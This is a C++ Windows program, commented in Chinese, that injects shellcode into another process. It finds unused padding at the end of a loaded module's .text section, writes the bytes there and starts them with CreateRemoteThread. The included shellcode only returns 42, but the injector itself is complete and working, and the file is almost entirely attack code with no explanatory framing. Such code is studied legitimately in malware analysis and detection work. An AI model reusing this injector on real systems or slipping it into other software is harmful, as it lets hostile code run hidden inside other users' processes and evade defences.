#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>

#pragma comment(lib, "psapi.lib")

// ============================================================
// Shellcode: mov eax, 42; ret（极简，便于测试）
// ============================================================
unsigned char shellcode[] = {
    0xB8, 0x2A, 0x00, 0x00, 0x00,
    0xC3
};
SIZE_T shellcodeSize = sizeof(shellcode);

// ============================================================
// 第一步：扫描指定模块的 .text 节，找到足够大的空隙
// 返回：空隙的起始地址（在目标进程里的绝对地址），失败返回 nullptr
// ============================================================
LPVOID FindCodeCave(HANDLE hProcess, HMODULE hModule, SIZE_T needSize) {
    BYTE* moduleBase = (BYTE*)hModule;

    BYTE localDos[0x40] = {0};
    if (!ReadProcessMemory(hProcess, moduleBase, localDos, 0x40, NULL))
        return nullptr;

    IMAGE_DOS_HEADER* pDos = (IMAGE_DOS_HEADER*)localDos;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    BYTE localNt[0x108] = {0};
    if (!ReadProcessMemory(hProcess, moduleBase + pDos->e_lfanew,
                           localNt, 0x108, NULL))
        return nullptr;

    IMAGE_NT_HEADERS* pNt = (IMAGE_NT_HEADERS*)localNt;
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    DWORD sectionAlignment = pNt->OptionalHeader.SectionAlignment;
    WORD numberOfSections = pNt->FileHeader.NumberOfSections;
    WORD sizeOfOptionalHeader = pNt->FileHeader.SizeOfOptionalHeader;

    DWORD sectionTableOffset = pDos->e_lfanew + 4 + 20 + sizeOfOptionalHeader;

    for (WORD i = 0; i < numberOfSections; i++) {
        IMAGE_SECTION_HEADER section;
        if (!ReadProcessMemory(hProcess,
                               moduleBase + sectionTableOffset + i * sizeof(IMAGE_SECTION_HEADER),
                               &section, sizeof(section), NULL))
            return nullptr;

        if (strncmp((char*)section.Name, ".text", 5) != 0) continue;

        BYTE* sectionStart = moduleBase + section.VirtualAddress;
        DWORD virtualSize = section.Misc.VirtualSize;

        DWORD alignedSize = ((virtualSize + sectionAlignment - 1) / sectionAlignment) * sectionAlignment;

        DWORD caveSize = alignedSize - virtualSize;
        if (caveSize < needSize) {
            std::cout << "[*] .text 节空隙只有 " << caveSize
                      << " 字节，不够 " << needSize << " 字节" << std::endl;
            continue;
        }

        BYTE* caveStart = sectionStart + virtualSize;
        std::vector<BYTE> caveBuffer(caveSize);
        if (!ReadProcessMemory(hProcess, caveStart, caveBuffer.data(), caveSize, NULL))
            return nullptr;

        bool isClean = true;
        for (DWORD j = 0; j < caveSize; j++) {
            if (caveBuffer[j] != 0x00 && caveBuffer[j] != 0xCC) {
                isClean = false;
                break;
            }
        }
        if (!isClean) {
            std::cout << "[*] 空隙被占用，跳过" << std::endl;
            continue;
        }

        std::cout << "[+] 找到空隙: 0x" << std::hex << (uintptr_t)caveStart
                  << " 大小: " << std::dec << caveSize << " 字节" << std::endl;
        return caveStart;
    }
    return nullptr;
}

// ============================================================
// 第二步：主注入流程
// ============================================================
int main() {
    DWORD pid;
    std::cout << "[*] 请输入目标进程 PID: ";
    std::cin >> pid;

    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
        PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD,
        FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess 失败: " << GetLastError() << std::endl;
        return 1;
    }

    HMODULE modules[1024];
    DWORD needed = 0;
    if (!EnumProcessModules(hProcess, modules, sizeof(modules), &needed)) {
        std::cerr << "[-] EnumProcessModules 失败" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    DWORD moduleCount = needed / sizeof(HMODULE);
    std::cout << "[*] 共找到 " << moduleCount << " 个模块" << std::endl;

    LPVOID caveAddr = nullptr;
    for (DWORD i = 0; i < moduleCount; i++) {
        char modName[MAX_PATH] = {0};
        GetModuleBaseNameA(hProcess, modules[i], modName, MAX_PATH);
        std::cout << "[" << i << "] 检查模块: " << modName << std::endl;

        caveAddr = FindCodeCave(hProcess, modules[i], shellcodeSize);
        if (caveAddr) {
            std::cout << "[+] 在 " << modName << " 中找到空隙!" << std::endl;
            break;
        }
    }

    if (!caveAddr) {
        std::cerr << "[-] 所有模块都没找到合适的空隙" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    if (!WriteProcessMemory(hProcess, caveAddr, shellcode, shellcodeSize, NULL)) {
        std::cerr << "[-] WriteProcessMemory 失败: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[+] Shellcode 写入成功" << std::endl;

    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)caveAddr,
        NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "[-] CreateRemoteThread 失败: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "[+] 注入完成" << std::endl;
    system("pause");
    return 0;
}